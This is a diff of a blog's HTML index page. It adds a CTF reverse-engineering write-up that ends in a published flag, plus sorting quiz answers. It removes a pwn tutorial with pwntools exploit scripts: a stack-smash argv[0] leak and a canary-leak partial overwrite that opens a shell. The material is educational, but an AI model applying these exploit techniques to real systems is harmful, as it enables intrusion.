+<p>接着进入第二个函数来分析</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__usercall sub_4012E0@&lt;eax&gt;(_BYTE *a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// esi</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// eax</span></span><br><span class="line">  LPCSTR v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  _BYTE *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v2 = konw_what;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= konw_what || (v3 = Src, Src &gt; v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( konw_what == dword_40384C )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401350();</span><br><span class="line">      v2 = konw_what;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v2 = *v1;</span><br><span class="line">      v2 = konw_what;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v1 - Src;</span><br><span class="line">    <span class="keyword">if</span> ( konw_what == dword_40384C )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401350();</span><br><span class="line">      v2 = konw_what;</span><br><span class="line">      v3 = Src;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v2 = v3[v4];</span><br><span class="line">      <span class="keyword">return</span> (konw_what++ + <span class="number">1</span>);c</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = v2 + <span class="number">1</span>;</span><br><span class="line">  konw_what = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到这个函数稍显复杂，我们当然可以一步一步慢慢分析，但我们可以从第15行的函数中发现一些线索，我们点进去</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_401350</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  LPCSTR v0; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = Src;</span><br><span class="line">  v1 = konw_what - Src;</span><br><span class="line">  <span class="keyword">if</span> ( (konw_what - Src) &gt; <span class="number">0xFFFFFFFE</span> )</span><br><span class="line">    <span class="built_in">std</span>::_Xlength_error(<span class="string">"vector&lt;T&gt; too long"</span>);</span><br><span class="line">  result = v1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt; dword_40384C - v0 )</span><br><span class="line">    result = sub_4013A0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>很显然这里实现了类似异常检测的功能，当我们的know_what（命名鬼才）-src的值过大的时候就会产生too long的错误，我们就可以推测，know_what - src的值就应该是用户输入的长度。</p>
+<p>最后一部分是关闭窗口的代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( konw_what - Src == <span class="number">11</span> &amp;&amp; x == <span class="number">771</span> &amp;&amp; y == <span class="number">0x63A421C737F6FFE0</span>i64 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( sub_401040(Src) )</span><br><span class="line">    MessageBoxA(<span class="number">0</span>, v8, <span class="string">"success"</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到他要求我们输入10个字符，和为771，乘积为0x63A421C737F6FFE0，，接着还会调用一个函数，在点进去看看</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __usercall sub_401040@&lt;eax&gt;(<span class="keyword">const</span> <span class="keyword">char</span> *input@&lt;ebx&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> data; <span class="comment">// al</span></span><br><span class="line">  _DWORD *judge_table; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> count; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// [esp+0h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) == <span class="number">10</span> )      <span class="comment">//检测输入长度是否为10</span></span><br><span class="line">  &#123;  </span><br><span class="line">    i = <span class="number">0</span>;                       <span class="comment">//循环变量我用i、j、count进行了标示</span></span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> ) </span><br><span class="line">    &#123;</span><br><span class="line">      data = input[i];</span><br><span class="line">      <span class="keyword">if</span> ( data &gt; <span class="number">90</span> || data &lt; <span class="number">65</span> )             <span class="comment">// 循环每一个值检测是否为大写字母</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++i &gt;= <span class="number">10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        judge_table = &amp;table;      </span><br><span class="line">        j = <span class="number">0</span>;</span><br><span class="line">        v7 = &amp;table;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          count = j;</span><br><span class="line">          <span class="keyword">if</span> ( j &lt; <span class="number">10</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">LABEL_12:</span><br><span class="line">          judge_table += <span class="number">0x11</span>;         <span class="comment">//judge_table每0x11个是一组</span></span><br><span class="line">          ++j;</span><br><span class="line">          v7 = judge_table;            </span><br><span class="line">          <span class="keyword">if</span> ( judge_table &gt;= &amp;border )    <span class="comment">//检查judge_table是否到头了</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( input[j] &gt; input[count] == *judge_table )   <span class="comment">//检测input的每个值和所有的值比较的结果是不是符合judge_table的结果</span></span><br><span class="line">        &#123;</span><br><span class="line">          ++count;</span><br><span class="line">          ++judge_table;</span><br><span class="line">          <span class="keyword">if</span> ( count &gt;= <span class="number">10</span> )         </span><br><span class="line">          &#123;</span><br><span class="line">            judge_table = v7;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;         <span class="comment">//这里实现了嵌套循环的功能</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>逻辑也不难，首先检测每个值是不是都是大写字母，然后就是依次拿出input的每个值，把值和另外的其他的值进行比较，且比较的结果要符合judge_table的里保存的真值。而由于judge_table是16个一循环的，我们可以把它当作一个矩阵结构，然后使用它的前十行前十列即可。</p>
+<p>到这里我们就有了如下的信息</p>
+<ul>
+<li>flag长度为10</li>
+<li>flag的每个值和另外的值比较的结果满足judge_table</li>
+<li>所有的值都是大写字母</li>
+<li>和为771，乘积为0x63A421C737F6FFE0</li>
+</ul>
+<p>我们可以通过分解乘积，将分解出的值固定在大写字母范围以内的方式来确定输入的字母，然后提取出来judge_table来搞定字母的顺序</p>
+<p>最终flag为<strong>LKSOQWEDSF</strong></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/21/数据结构基础-排序/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -570,6 +766,14 @@
 <li>i=2 处填上base值46<br>此时 40， 38，46，56，79，84<br>选C</li>
 </ol>
 </blockquote>
+<p><strong>2-13对于序列{ 49，38，65，97，76，13，27，50 }，按由小到大进行排序，下面哪一个是初始步长为4的希尔排序法第一趟的结果？</strong></p>
+<p>希尔排序应该说是亲民的一种排序了。。。代码亲民，选择做起来也不难。下面来简单说一下希尔排序的过程。</p>
+<p>首先选择len/2作为增了，然后前len/2个分别和后len/2个一一对应算是一组，然后这俩组成的一组进行比较交换。</p>
+<p>第二步让增量/2得到新的增量，然后重复上面的操作，直至增量为1，进行最后一次排序</p>
+<p><strong>2-14给定初始待排序列{ 15，9，7，8，20，-1，4 }。如果希尔排序第一趟结束后得到序列为{ 15，-1，4，8，20，9，7 }，则该趟增量为</strong></p>
+<p>会了希尔排序之后这个就很简单了</p>
+<p><strong>2-16对于10个数的简单选择排序，最坏情况下需要交换元素的次数为：</strong></p>
+<p>就是每两个都得交换，也就是9次</p>
 
           
         
@@ -1954,222 +2158,6 @@ p.interactive()
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/22/pwn学习（7）花式栈溢出2/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/22/pwn学习（7）花式栈溢出2/" itemprop="url">pwn学习（7）花式栈溢出2</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-22T21:58:58+08:00">
-                2018-11-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>唉，学业繁忙，计算机网络和数据结构马上就要结课了还要拿出时间来复习，感觉最近时间有些不够用。不抱怨了，还是看看今天看的两个知识点，可能写的不是很详细，主要还是时间不太够了。</p>
-<h1 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们都知道有个保护措施叫canary，简单来讲就是在push ebp之后在栈上放个“哨位”，“监视”你的栈，一旦你想溢出，那势必就会破坏这个“哨位”，程序在最后回去检查这个“哨位”，如果你篡改了，那就会报错了</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxh7xp4r3dj30nm030q3o.jpg" alt=""></p>
-<p>如图就是函数在开始时进行的设置“哨位”</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxh80n0v9ej30h202mt97.jpg" alt=""></p>
-<p>这是在函数最后的检查</p>
-<p>当然明白了这些还不够，我们还需要知道一点关于这个错误的一些信息，下面我们试着覆盖掉canary来看看会发生什么</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxh8djl3uuj314s0hcqfn.jpg" alt=""></p>
-<p>可以看到除了程序的输出外，还额外打印了一句</p>
-<pre><code>*** stack smashing detected ***: ./smashes.dms terminated
-</code></pre><p>这就是重点了，他告诉我们出错了，而且附加了我们的程序名字！名字哪来的？大胆猜猜，在开始运行输入的命令行中，arg0就是我们的程序名！当然这是瞎猜的，秉持着唯真求新的校训，我们还是来看一看具体的实现原理</p>
-<pre><code>void __attribute__ ((noreturn)) __stack_chk_fail (void)
-{
-  __fortify_fail (&quot;stack smashing detected&quot;);
-}
-void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
-{
-  /* The loop is added only to keep gcc happy.  */
-  while (1)
-    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,
-                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
-}
-</code></pre><p>可以看到竟（guo）然（ran）和我们想的一样，那我们就可以想到了，那我们只要覆盖掉arg0，那我们岂不是就可以借助这个输入拿到我们想要的信息了？</p>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>知道了原理那就赶紧做个题目练练手吧，题目来自jarvis oj，名字是smashes，大家可以自己去下载一下</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxh8ssx30tj310o0isjvd.jpg" alt=""></p>
-<p>保护开启了nx、canary，ida看一下发现有明显的栈溢出漏洞，但还有个很好玩的地方，在我们输入第二个字符串后，它会将某个地址里的内容覆盖掉。我们查看后发现被覆盖掉的地方就是flag的存储位置。</p>
-<p>那么问题来了，不管输入什么我们的flag都会被覆盖，那一定flag就会被改掉吗？当然不是，这里需要一个小知识点了</p>
-<p><strong>在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找。</strong></p>
-<p>我们利用find CTF的方式就可以找到flag的另一处地址，紧接着我们可以在arg0上放入我们的flag地址，借助canary的错误机制将其打印出来，当然过程中需要使用gdb调试来获得包括arg0的地址、变量的地址等等，这就不细说了，直接上脚本了</p>
-<pre><code>from pwn import *
-#p = process(&apos;./smashes.dms&apos;)
-p = remote(&apos;pwn.jarvisoj.com&apos;, 9877)
-flag_addr = 0x400d21
-arg0_addr = 0x7fffffffdf48
-name_addr = 0x7fffffffdd30
-payload = (arg0_addr - name_addr)*&apos;a&apos; + p64(flag_addr)
-
-p.recvuntil(&apos;name? &apos;)
-p.sendline(payload)
-p.recvuntil(&apos;flag: &apos;)
-p.sendline(&apos;bb&apos;)
-data = p.recv()
-log.info(data)
-</code></pre><p>要注意因为我们只是拿到了flag并没有get shell，所以最后不进行交互也可以，打印出来就好了</p>
-<h1 id="栈上的-partial-overwrite"><a href="#栈上的-partial-overwrite" class="headerlink" title="栈上的 partial overwrite"></a>栈上的 partial overwrite</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>在程序开启了 PIE 保护时 (PIE enabled) 高位的地址会发生随机化, 但低位的偏移是始终固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护</p>
-<h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p>原理看上去有点难以理解，但有了例题就好理解多了，题目是安恒杯 2018 年 7 月月赛的 babypie </p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxh975vl2xj30ke08iq4o.jpg" alt=""></p>
-<p>保护开启了canary和pie，还是ida分析发现明显的栈溢出，这里就要用到一个骚操作了，我们看到read了最大0x30的字节，我们又知道read是不会给输入的字符串加上\0的结束符的，而printf又是读到00字节才结束输出，那也就是说我们可以输入一部分内容，然后顺带着输出canary，之后再进行栈溢出的时候我们就可以恢复canary的值了</p>
-<p>那具体该怎么实现呢？首先是ebp的地址离我们输入的buf偏移是0x30，当然ebp之后还有个0x8大小的canary，canary的最低字节是00，为了输出cannary剩下的值我们把这里也覆盖掉，也就是覆盖的字节数应该是0x30 - 0x8 + 1这么个大小</p>
-<p>拿到canary后我们就可以考虑如何构造payload了，因为程序中给了get shell函数，所以我们直接用ida得到的地址（可不是真实地址哦）来覆盖函数返回地址的低位，然后就是听天由命了，总有对的时候</p>
-<p>思路齐全，上exp喽</p>
-<pre><code>#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-from pwn import *
-#  context.log_level = &quot;debug&quot;
-
-
-while True:
-    try:
-        io = process(&quot;./babypie.dms&quot;, timeout = 1)
-
-        #  gdb.attach(io)
-        io.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8 + 1))
-        io.recvuntil(&apos;a&apos; * (0x30 - 0x8 + 1))
-        canary = &apos;\0&apos; + io.recvn(7)
-        success(canary.encode(&apos;hex&apos;))
-
-        #  gdb.attach(io)
-        io.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8) + canary + &apos;bbbbbbbb&apos; + &apos;\x3E\x0A&apos;)
-
-        io.interactive()
-    except Exception as e:
-        io.close()
-        print e
-</code></pre><p>Successful</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2220,7 +2208,7 @@ while True:
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-count">20</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2231,7 +2219,7 @@ while True:
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
